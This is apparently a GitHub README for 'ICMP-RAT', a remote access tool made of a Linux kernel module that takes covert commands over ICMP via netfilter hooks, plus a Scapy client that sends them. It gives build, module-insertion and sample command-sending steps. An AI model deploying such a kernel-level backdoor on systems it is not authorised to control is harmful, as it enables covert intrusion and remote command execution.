# ICMP-RAT
Linux kernel module client that gets payload commands with netfilter hooks from a Scapy client.

This repo has a server side (the kernel module that is built and inserted into a Linux box) and the client side (the Scapy based Python3 script used to send commands). 

To set up:

Linux (server) side:
```
user@yourbox:~/dir$ git clone https://github.com/benjaminkravets/ICMP-RAT.git
user@yourbox:~/dir$ cd /ICMP-RAT/servermodule
user@yourbox:~/dir/ICMP-RAT/servermodule$ make 
```
Scapy Python3 (client) side:
```
user@yourbox:~/dir$ git clone https://github.com/benjaminkravets/ICMP-RAT.git
user@yourbox:~/dir$ cd /ICMP-RAT/clientscript
```

To use:

Linux (server) side:
```
user@yourbox:~/dir/ICMP-RAT/servermodule$ sudo insmod icmpclient.ko
```
Scapy Python3 (client) side:
```
user@yourbox:~/dir/ICMP-RAT/clientscript$ sudo python3 client.py -i 10.0.2.14 -c "touch /home/user/Desktop/hello" -t 2
```


This tool does not currently support a command line output return to the sender, all commands are sent blind with no return. 

Not well tested and still in progress.
